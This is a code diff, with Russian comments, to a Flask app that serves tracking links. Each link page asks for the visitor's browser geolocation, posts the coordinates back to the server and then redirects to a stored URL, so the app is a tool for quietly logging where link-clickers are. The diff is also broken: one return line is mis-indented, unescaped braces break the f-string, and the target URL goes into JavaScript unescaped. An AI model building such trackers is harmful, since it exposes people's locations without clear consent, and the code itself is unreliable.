@@ -59,6 +59,12 @@ def create_link():
 
 @app.route('/<link_id>', methods=['GET', 'POST'])
 def track(link_id):
+    # Получаем целевой URL ДО любого кода
+    with sqlite3.connect(app.config['DATABASE']) as conn:
+        c = conn.cursor()
+        c.execute("SELECT target_url FROM links WHERE id = ?", (link_id,))
+        target = c.fetchone()
+
     if request.method == 'POST':
         # Обработка данных геолокации
         data = request.json
@@ -123,35 +129,39 @@ def track(link_id):
         conn.commit()
     
     # Перенаправление + отправка HTML с запросом геолокации
-    return f'''
+     return f'''
     <!DOCTYPE html>
     <html>
     <body>
     <script>
-    // Запрос геолокации
     function getLocation() {{
+        // Исправленная строка:
+        const redirectUrl = "{target[0] if target else 'https://google.com'}/";
+
         if (navigator.geolocation) {{
             navigator.geolocation.getCurrentPosition(
                 function(position) {{
-                    // Отправляем координаты на сервер
                     fetch(window.location.href, {{
                         method: 'POST',
-                        headers: {{
-                            'Content-Type': 'application/json',
-                        }},
+                        headers: {{ 'Content-Type': 'application/json' }},
                         body: JSON.stringify({{
                             lat: position.coords.latitude,
                             lon: position.coords.longitude,
                             log_id: {log_id}
                         }})
-                    }}).then(() => window.location = "{target[0] if target else 'https://google.com'}");
+                    }}).then((res) => {
+                            console.log(res);
+                            console.log(redirectUrl);
+                            console.log(window.location);
+                            return window.location = redirectUrl
+                        });
                 }},
                 function(error) {{
-                    window.location = "{target[0] if target else 'https://google.com'}";
+                    window.location = redirectUrl;
                 }}
             );
         }} else {{
-            window.location = "{target[0] if target else 'https://google.com'}";
+            window.location = redirectUrl;
         }}
     }}
     getLocation();
